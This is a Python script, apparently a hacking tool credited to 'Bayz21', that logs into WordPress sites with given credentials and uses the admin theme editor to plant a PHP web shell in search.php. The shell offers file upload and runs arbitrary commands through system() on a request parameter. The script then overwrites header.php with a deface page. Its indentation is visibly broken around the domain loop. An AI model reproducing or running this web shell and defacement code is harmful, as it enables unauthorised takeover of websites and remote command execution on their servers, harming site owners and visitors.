import requests, re, sys, os
from platform import system
def clearscrn() :
  if system() == 'Linux':
    os.system('clear')
  if system() == 'Windows':
    os.system('cls')
clearscrn()
print("=========================================")
print("MASS Upload Shell & Auto Deface Wordpress")
print("          -= Coded by Bayz21 =-          ")
print("        http://github.com/bayz21/        ")
print("           Recoded from Wp-sud           ")
print("=========================================")

with requests.session() as c:
	list_domain = open("domen.txt", "r").readlines()
       for line in list_domain:
		   url = line.rstrip()
	url2 = url + '/wp-login.php'
	admin = url + '/wp-admin/'
	username = raw_input('[+]Put username: ')
	password = raw_input('[+]Put password: ')
	filename = raw_input('[+]put deface page name: ')
	defopen = open(filename, 'r')
	defcode_1 = defopen.read()
	defcode = defcode_1.replace("\"","'")
	headers = {'Referer':url, 'User-Agent':'Mozilla/5.0'}
	try:
		p=c.get(url2, headers = headers)
		code=str(p.status_code)
	except (requests.exceptions.RequestException, IOError):
		print ('Error Occured when trying to get login url!\nclosing program!')
		sys.exit()
	v= '200'
	if code == v:
		print ('===> URL is OK. Trying to Log In....')
		login_data={'log':username, 'pwd':password, 'wp-submit':'Log+In','redirect_to':admin, 'testcookie':'1'}
		try:
			c.post(url2, data=login_data,headers=headers)
			test=c.get(admin,headers=headers)
			code2=str(test.status_code)
		except (requests.exceptions.RequestException, IOError):
			print ('Error Occured when trying to login!\nclosing program!')
			sys.exit()
		if code2 == v:
			print('===> login Success! Uploading Shell....')
			editor=admin + 'theme-editor.php?file=search.php#template'
			edit=admin + 'theme-editor.php'
			try:
				req=c.get(editor, headers=headers)
				source=req.content
			except (requests.exceptions.RequestException, IOError):
				print ('Error Occured when trying to edit theme!\nclosing program!')
				sys.exit()
			n=re.findall('<option value="(.*?)" selected="selected">',source)
			if n:
				i = n[0]
			else:
				print ('Error Occured when trying to get themename!\nclosing program!')
				sys.exit()
			nonce=re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source)
			if nonce:
				wpnonce=nonce[0]
			else:
				print ('Error Occured when trying to get wpnonce!\nclosing program!')
				sys.exit()
			shellcode = """<?php
$files = @$_FILES['files'];
if ($files['name'] != '') {
$fullpath = $_REQUEST['path'] . $files['name'];
if (move_uploaded_file($files['tmp_name'], $fullpath)) {
echo \"<h1><a href='$fullpath'>OK-Click here!</a></h1>\";
}
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype=multipart/form-data action=><input type=text name=path><input type=file name=files><input type=submit value=Up></form></body></html>';
?><?php $cmd = <<<EOD
cmd
EOD;
if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>"""
			form_data = {"_wpnonce":wpnonce, "_wp_http_referer":"/wp-admin/theme-editor.php?file=search.php", "newcontent":shellcode, "action":"update", "file":"search.php", "theme":i, "scrollto":"0", "docs-list":"", "submit":"Update+File"}
			try:
				c.post(edit, data=form_data, headers=headers)
				shell=url + "/wp-content/themes/" + i + "/search.php"
				ss=c.get(shell, headers=headers).content
			except (requests.exceptions.RequestException, IOError):
				print ('Error Occured when trying to edit theme!\nclosing program!')
				sys.exit()
			title="<title>Upload files...</title>"
			if title in ss:
				print("===> Shell Uploaded Successfully! :D")
				print("===> " + shell) 
				print('===> Uploading deface page...')
				try:
					editor2=admin + 'theme-editor.php?file=header.php#template'
					req2=c.get(editor2, headers=headers)
					source2=req2.content
				except (requests.exceptions.RequestException, IOError):
					print ('Error Occured when trying to get wpnonce!\nclosing program!')
					sys.exit()

				nonce2=re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source2)
				if nonce2:
					wpnonce2=nonce2[0]
				else:
					print ('Error Occured when trying to get wpnonce!\nclosing program!')
					sys.exit()
				try:
					defc="<?php die(\"" + defcode + "\"); ?>"
					form_data2 = {"_wpnonce":wpnonce2, "_wp_http_referer":"/wp-admin/theme-editor.php?file=header.php", "newcontent":defc, "action":"update", "file":"header.php", "theme":i, "scrollto":"0", "docs-list":"", "submit":"Update+File"}
					c.post(edit, data=form_data2, headers=headers)
				except (requests.exceptions.RequestException, IOError):
					print ('Error Occured when trying to add defacepage!\nclosing program!')
					sys.exit()
				print('===>Maybe Successfully Defaced Homepage! Check Manually....')
			else:
				print("===> Shell Upload Failed :(")
				print("===> upload deface failed :(")
		else:
			print('===> Login Failed! Maybe Your password is incorrect!')
	else:
		print ('===> Couldn\'t get '+ url2 +'\nPlease restart the program & put valid url')
